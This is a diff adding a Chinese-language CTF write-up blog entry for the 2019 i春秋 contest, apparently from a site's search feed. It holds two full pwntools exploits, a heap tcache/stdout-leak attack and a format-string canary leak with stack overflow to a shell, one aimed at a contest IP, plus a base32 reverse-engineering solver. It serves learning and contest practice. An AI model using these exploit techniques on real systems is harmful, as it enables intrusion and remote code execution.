@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>2019I春秋答题赛</title>
+      <link href="/2019/11/05/2019i-chun-qiu-da-ti-sai/"/>
+      <url>/2019/11/05/2019i-chun-qiu-da-ti-sai/</url>
+      
+        <content type="html"><![CDATA[<h3 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h3><p>做出来了两个pwn题目（其中一个是复现出来的。。。。）：<br>首先说一个pwn2，这个题目真是让我张了不少知识，不仅理解了tcache和unsorted bin attack还学会怎么patch elf文件的libc和ld链接器，同时学了一波文件的_IO_stdout_，下面贴一个“改革春风吹满地”大佬写的exp</p><pre><code>#coding=utf-8from pwn import *local = 1exec_file=&quot;./easy_heap&quot;context.binary=exec_filecontext.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]elf=ELF(exec_file,checksec = False)if local :    argv=[&quot;/glibc/x64/2.27/lib/ld-2.27.so&quot;,&quot;--library-path&quot;,&quot;/glibc/x64/2.27/lib/&quot;,&quot;./easy_heap&quot;]    a=process(argv=argv)    libc=ELF(&quot;/glibc/x64/2.27/lib/libc.so.6&quot;)else:    a=remote(&quot;&quot;)def get_base(a):    text_base = a.libs()[a._cwd+a.argv[0].strip(&#39;.&#39;)]    for key in a.libs():        if &quot;libc.so.6&quot; in key:            return text_base,a.libs()[key]def debug():    #text_base,libc_base=get_base(a)    #script=&quot;set $text_base=&quot;+str(text_base)+&#39;\n&#39;+&quot;set $libc_base=&quot;+str(libc_base)+&#39;\n&#39;    script=&#39;&#39;&#39;    b *(0x7ffff7bd5000+0x0000000000009E2)    b *(0x7ffff7bd5000+0x00000000000009FE)    &#39;&#39;&#39;    gdb.attach(a,script)def fuck(address):    n = globals()    for key,value in n.items():        if value == address:            return success(key+&quot;  ==&gt;  &quot;+hex(address))def menu(idx,flag=True):    if flag:        a.sendlineafter(&quot;2. free\n&quot;,str(idx))    else:        a.sendlineafter(&quot;2. free&quot;,str(idx))def add(content,flag=True):    menu(1,flag)    if flag:        a.sendafter(&quot;content:\n&quot;,content)    else:        a.sendafter(&quot;content:&quot;,content)def delete(idx,flag=True):    menu(2,flag)    if flag:        a.sendlineafter(&quot;\n&quot;,str(idx))    else:        a.sendlineafter(&quot;:&quot;,str(idx))add(p64(0x91)+p64(0x91))#0 90是为了之后进入unsortbinadd(p64(0x21)*6)#1add(p64(0x21)*6)#2delete(0)delete(0)delete(0)add(&#39;\x70&#39;)#3 //修改最低字节这时候tcache的最后一个被改成0x70结尾add(&#39;A&#39;)#4 拿出一个add(&#39;A&#39;)#5 get fake chunk 拿到目标for i in range(8):  #多次free进入unsortedbin拿到arean地址    delete(5)add(&#39;\x60\x07\xbd&#39;)#6 地址修改到stdoutdelete(3)delete(3)delete(3)delete(3)add(&#39;\x70&#39;)#7add(&#39;\x70&#39;)#8add(&#39;/bin/sh\x00&#39;)#9add(p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;)#10a.recvuntil(p64(0xfbad1800))a.recvuntil(&quot;\x7f&quot;)libc_base=u64(a.recvuntil(&quot;\x7f&quot;)[-6:]+&#39;\x00\x00&#39;)-131-libc.symbols[&quot;_IO_2_1_stdout_&quot;]fuck(libc_base)delete(7,False)delete(7,False)add(p64(libc_base+libc.symbols[&quot;__free_hook&quot;]-8),False)#11add(&#39;A&#39;,False)add(&quot;/bin/sh\x00&quot;+p64(libc_base+libc.symbols[&quot;system&quot;]),False)delete(9,False)a.interactive()</code></pre><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><p>还有就是一个栈的题目了，这个题目跟平常哪个格式化字符和栈溢出有所不同，因为它限制了格式化可以打印出的栈里面的数据，本来还有点没头绪，但是得大哥指点，64位的机子上寄存器里面还有很多参数呢，乌拉，果真在寄存器里面泄露出来了一个真实地址哦，真实顶哦：</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *context.log_level = &#39;debug&#39;r = remote(&#39;120.55.43.255&#39;,30022 )#r = process(&#39;./easy&#39;)libc = ELF(&#39;libc-2.23.so&#39;)r.recvuntil(&#39;Input your name:\n&#39;)one_gadget_offset = 0x4526apayload1 = &#39;%7$p&#39; #7payload3 = &#39;%3$p&#39; #7r.send(payload1)canary = int(r.recv()[0:18],16)print &#39;canary = &#39; + hex(canary)#r.recvuntil(&#39;note:\n&#39;)payload2 = &#39;a&#39; * 8 + p64(canary) + &#39;b&#39;*8 + &#39;\x30\x4a&#39;r.send(payload2)r.recvuntil(&#39;Input your name:\n&#39;)#gdb.attach(r)r.send(payload3)ret_1 = int(r.recv()[0:14],16) - 0xf7260#raw_input(&#39;@:&#39;)print &#39;addr = &#39; + hex(ret_1)system_addr = ret_1 + one_gadget_offsetr.recvuntil(&#39;Input the note:\n&#39;)print &#39;system_addr = &#39; + hex(system_addr)payload2 = &#39;a&#39; * 8 + p64(canary) + &#39;b&#39; * 8 + p64(system_addr)r.sendline(payload2)r.interactive()</code></pre><h3 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h3><p>这个就比较简单了，主要的难点可能就是一个苹果系统的文件，如果你没有mac,或者没有黑苹果的话，就没法子动态调试，不过base32还是比较容易看出的吧，然后在有一个简单的加密就可了。</p><pre><code>key = [1,2,3,1,4,5,6,7,8,9,10,11,12,13,14,6,15,16,5,17,4,15,10,24,15,18,11,19,20,6,5,1,13,18,17,12,5,10,13,1,44,17,3,13,5,52,4,13,17,21,43,11]flag = {1:&#39;G&#39;,2:&#39;5&#39;,3:&#39;S&#39;,4:&#39;I&#39;,5:&#39;Z&#39;,6:&#39;B&#39;,7:&#39;V&#39;,8:&#39;H&#39;,9:&#39;F&#39;,10:&#39;R&#39;,11:&#39;T&#39;,12:&#39;E&#39;,13:&#39;Y&#39;,14:&#39;L&#39;,15:&#39;M&#39;,16:&#39;U&#39;,17:&#39;D&#39;,18:&#39;4&#39;,19:&#39;Q&#39;,20:&#39;O&#39;,21:&#39;C&#39;,22:&#39;G5&#39;,23:&#39;5S&#39;,24:&#39;SG&#39;,25:&#39;GI&#39;,26:&#39;IZ&#39;,27:&#39;ZB&#39;,28:&#39;BV&#39;,29:&#39;VH&#39;,30:&#39;HF&#39;,31:&#39;FR&#39;,32:&#39;RT&#39;,33:&#39;TE&#39;,34:&#39;EY&#39;,35:&#39;YL&#39;,36:&#39;LB&#39;,37:&#39;BM&#39;,38:&#39;MU&#39;,39:&#39;UZ&#39;,40:&#39;ZD&#39;,41:&#39;DI&#39;,42:&#39;IM&#39;,43:&#39;MR&#39;,44:&#39;RS&#39;,45:&#39;SGM&#39;,46:&#39;M4&#39;,47:&#39;4T&#39;,48:&#39;TQ&#39;,49:&#39;QO&#39;,50:&#39;OB&#39;,51:&#39;BZ&#39;,52:&#39;ZG&#39;,53:&#39;GY&#39;,54:&#39;Y4&#39;,55:&#39;4D&#39;,56:&#39;DE&#39;,57:&#39;EZ&#39;,58:&#39;ZR&#39;,59:&#39;RY&#39;,60:&#39;YG&#39;,61:&#39;GR&#39;,62:&#39;RSD&#39;,63:&#39;DS&#39;,64:&#39;SY&#39;,65:&#39;YZ&#39;,66:&#39;ZZ&#39;,67:&#39;ZGI&#39;,68:&#39;IY&#39;,69:&#39;YD&#39;,70:&#39;DC&#39;,71:&#39;CM&#39;,72:&#39;MRT&#39;}s = &#39;&#39;for i in key:    s += flag[i]import base64print base64.b32decode(s)</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF题解 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn reserve </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>32位逆向分析技术</title>
       <link href="/2019/09/17/32-wei-ni-xiang-fen-xi-ji-zhu/"/>
       <url>/2019/09/17/32-wei-ni-xiang-fen-xi-ji-zhu/</url>
